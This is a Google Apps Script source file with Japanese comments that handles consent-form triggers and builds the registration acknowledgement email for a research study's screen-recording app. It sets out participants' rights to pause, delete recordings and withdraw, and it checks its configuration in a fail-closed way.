 * 段 1 の受付メールの本文。`appDownloadUrlOpt` を渡すとその値を使う（O1 の `o1RegisterAckBody_` と同じ理由:
 * 事前確認と本送信で同じスナップショットを使う）。URL に問いがあれば投げる（最後の砦）。
 */
function s1RegisterAckBody_(pid, appDownloadUrlOpt) {
  var cfg = s1Config_();
  var appDownloadUrl = appDownloadUrlOpt === undefined ? cfg.appDownloadUrl : appDownloadUrlOpt;
  var problem = s1AppDownloadUrlProblem_(appDownloadUrl, cfg.o1AppDownloadUrl);
  if (problem) {
    throw new Error(problem + "（受付メールを作りません・fail-closed）");
  }
  return [
    "ご登録ありがとうございます。",
    "",
    "【あなたの参加者ID】",
    "    " + pid,
    "アプリの最初の画面でこの記号を入力していただきます。",
    "この記号は氏名とは別に保管され、記録には氏名もメールアドレスも入りません。",
    "",
    "【アプリの入手】",
    "    " + appDownloadUrl,
    "お使いの OS 用の zip ファイルをダウンロードし、展開したフォルダをそのままデスクトップなどに置いてください。",
    "フォルダの中のファイルは 1 つも消したり動かしたりしないでください。",
    "同じフォルダにある目印のファイルを見て、アプリが動作を決めています。",
    "同梱の説明書に、最初の 1 回だけ必要な手順が書いてあります。",
    "",
    "【始める日について】",
    "始める日と終わる日は、研究者からお知らせします（" + S1_PERIOD_TEXT + "）。",
    "アプリは、パソコンにログインしたときに自動で起動するよう設定されます（設定でいつでも切れます）。",
    "",
    "【いつでもできること】",
    "1. 記録中は画面に印が出ます。印が出ていないときは記録していません。",
    "2. ワンクリックで一時停止できます。理由をお聞きすることはありません。一時停止中は問いが出ません。後半の期間なら、一時停止中も画面の表示は出たままですが、操作には合わせて動かず、表示についても記録しません。",
    "3. あとから「昨日の 14:00〜15:00 を消して」のように時間帯を指定して削除できます（直前の時間帯は、一時停止せずに消してください）。",
    "   記録が研究者へ送られるのは 1 日ぶんをまとめてから 48 時間後です。それより前なら、あなたの端末の上で消えます。",
    "   送られたあとの削除は、下の連絡先へお申し出ください（研究者側で削除し、記録に残します）。",
    "",
    "【問いと画面の表示】",
    "作業中にときどき出る問いには、答えなくてかまいません（1 時間に多くても " + S1_MAX_PROBES_PER_HOUR + " 回）。",
    "問いは、アプリの画面で「問いに同意する」を押してから出るようになります。",
    "後半の期間に出る画面の表示は、アプリのアイコンのメニューの「やめる」でその日のあいだ消せます。",
    "",
    "【参加をやめたくなったら】",
    "いつでもやめられます。不利益は一切ありません。",
    "アプリの画面で「問いへの同意を取り消す」を押すと、参加をやめたことになります。そのあとはアプリを終了し、自動で起動する設定を切って、研究者にお知らせください。",
    "取り消しても、アプリを終了するまでは記録が続き、送られます。その分は研究者が削除します。",
    "やめるときに、それまでの記録をすべて削除するようお求めいただけます。",
    "",
    "【お問い合わせ】",
    "  " + O1_CONTACT_NAME + "（" + O1_AFFILIATION + "）",
    "  " + O1_CONTACT_EMAIL,
    "",
    "どうぞよろしくお願いいたします。",
  ].join("\n");
}

/** 受付メールの文面を Logger に出すだけ（送信しない）。 */
function previewS1RegisterAckEmail() {
  var body;
  try {
    body = s1RegisterAckBody_("P999");
  } catch (e) {
    Logger.log("文面を作れません: " + e);
    return "";
  }
  Logger.log("件名: " + s1RegisterAckSubject_());
  Logger.log("--------");
  Logger.log(body);
  Logger.log("--------");
  Logger.log("これは preview です。送信していません。");
  return body;
}

function s1RegProfile_() {
  return {
    label: "S1-C",
    handler: "onS1ConsentSubmit",
    kind: S1_MGMT_KIND,
    checkFn: "checkS1FormConfig()",
    appUrl: function () {
      return s1Config_().appDownloadUrl;
    },
    ackSubject: s1RegisterAckSubject_,
    ackBody: s1RegisterAckBody_,
  };
}

/** 段 1 の同意フォームの提出で走る。流れは O1 と同じ（`o1HandleConsentSubmit_`）。 */
function onS1ConsentSubmit(e) {
  o1HandleConsentSubmit_(e, s1RegProfile_());
}

/**
 * 段 1 のトリガを張る。設定に問いがあれば、既存のトリガを消す前に止める。
 * O1 のトリガ（`onO1ConsentSubmit`）には触らない。
 */
function installS1ConsentTrigger() {
  var problems = s1ConfigProblems_();
  if (problems.length) {
    throw new Error(
      "設定に問題があるのでトリガを張りません（fail-closed）:\n  - " +
        problems.join("\n  - ") +
        "\n既存のトリガは消していません。"
    );
  }
  // 先にフォームを開いて中身を確かめる。開けない・未構築なら、既存のトリガを外す前に止める。
  var form = s1OpenFixed_(s1Config_().consentFormId);
  var shape = s1ConsentFormShapeProblems_(form);
  if (shape.length) {
    throw new Error(
      "S1-C の中身が同意の項目と合わないのでトリガを張りません（buildS1ConsentForm() を先に）:\n  - " +
        shape.join("\n  - ") +
        "\n既存のトリガは消していません。"
    );
  }
  // 新しいトリガを作ってから古いものを外す（作れなかったときに今のトリガを失わない）。
  var old = ScriptApp.getProjectTriggers().filter(function (t) {
    return t.getHandlerFunction() === "onS1ConsentSubmit";
  });
  ScriptApp.newTrigger("onS1ConsentSubmit").forForm(form).onFormSubmit().create();
  old.forEach(function (t) {
    ScriptApp.deleteTrigger(t);
  });
  if (old.length) Logger.log("既存の onS1ConsentSubmit トリガを " + old.length + " 件削除しました");
  Logger.log("onS1ConsentSubmit トリガを S1-C に設定しました");
  Logger.log("O1_AUTO_SEND=" + O1_AUTO_SEND + "（false=ログに出すだけ / true=自動送信）");
}

/**
 * S1-C の中身の問い（無ければ空）。チェックの項目が同意の項目と同じ順・全部必須で、
 * 登録の設問がそろっているかを見る。
 */
function s1ConsentFormShapeProblems_(form) {
  var out = [];
  var items = form.getItems();
  var want = s1ConsentItemTitles_();
  var boxes = [];
  var titles = [];
  for (var i = 0; i < items.length; i++) {
    var t = items[i].getTitle();
    titles.push(t);
    if (items[i].getType() === FormApp.ItemType.CHECKBOX) boxes.push(items[i]);
  }
  if (boxes.length !== want.length) out.push("同意のチェックの項目が " + boxes.length + " 件（期待 " + want.length + " 件）");
  for (var k = 0; k < Math.min(boxes.length, want.length); k++) {
    if (boxes[k].getTitle() !== want[k]) out.push("同意の項目 " + (k + 1) + " の文がコードと違う");
    else if (!boxes[k].asCheckboxItem().isRequired()) out.push("同意の項目 " + (k + 1) + " が必須でない");
    else {
      var cs = boxes[k].asCheckboxItem().getChoices();
      if (cs.length !== 1 || cs[0].getValue() !== S1_CONSENT_CHOICE) out.push("同意の項目 " + (k + 1) + " の選択肢がコードと違う");
    }
  }
  O1_REGISTRATION_TITLES.forEach(function (r) {
    if (titles.indexOf(r) < 0) out.push("登録の設問「" + r + "」が無い");
  });
  return out;
}

/** 段 1 のトリガだけを外す（O1 のトリガは残す）。 */
function removeS1ConsentTriggers() {
  var triggers = ScriptApp.getProjectTriggers();
  var n = 0;
  for (var i = 0; i < triggers.length; i++) {
    if (triggers[i].getHandlerFunction() === "onS1ConsentSubmit") {
      ScriptApp.deleteTrigger(triggers[i]);
      n++;
    }
  }
  if (n) Logger.log("既存の onS1ConsentSubmit トリガを " + n + " 件削除しました");
}
